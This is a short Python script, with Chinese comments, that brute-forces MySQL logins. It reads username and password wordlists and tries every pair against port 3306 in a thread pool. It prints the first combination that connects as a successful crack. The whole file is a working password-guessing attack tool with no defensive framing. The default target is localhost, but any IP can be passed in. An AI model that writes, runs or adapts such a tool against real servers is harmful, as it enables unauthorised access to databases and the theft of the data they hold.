#!/usr/bin/env python
# -*- coding: UTF-8 -*-
"""
@Project ：pythonProject1 
@File    ：mysql_blast.py
@Author  ：林香
@Date    ：2023/7/17 10:44 
@脚本说明：
"""
import pymysql
from concurrent.futures import ThreadPoolExecutor


class Mysql_burst:

    def conn(self, ip, port, user, password):
        # 建立数据库连接
        try:
            conn = pymysql.Connect(
                host=ip,
                port=port,
                user=user,
                password=password
            )
            conn.close()
            return user, password
        except:
            return False

    def brute(self, ip):
        # 读取账号和密码
        with open("./conf/username.txt", "r") as f:
            usernames = f.read().splitlines()
        with open("./conf/password.txt", "r") as file:
            passwords = file.read().splitlines()

        pool = ThreadPoolExecutor(3)
        results = []
        # 遍历文件进行爆破
        for username in usernames:
            for password in passwords:
                # 调用爆破方法进行登录
                result = pool.submit(self.conn, ip, 3306, username, password)
                results.append(result)
        # 遍历results列表，检查每个任务的执行结果
        for result in results:
            if result.result():
                print(f"[+]  爆破成功!!用户名：{result.result()[0]}，密码：{result.result()[1]}")
                break


if __name__ == '__main__':
    Mysql_burst().brute("127.0.0.1")
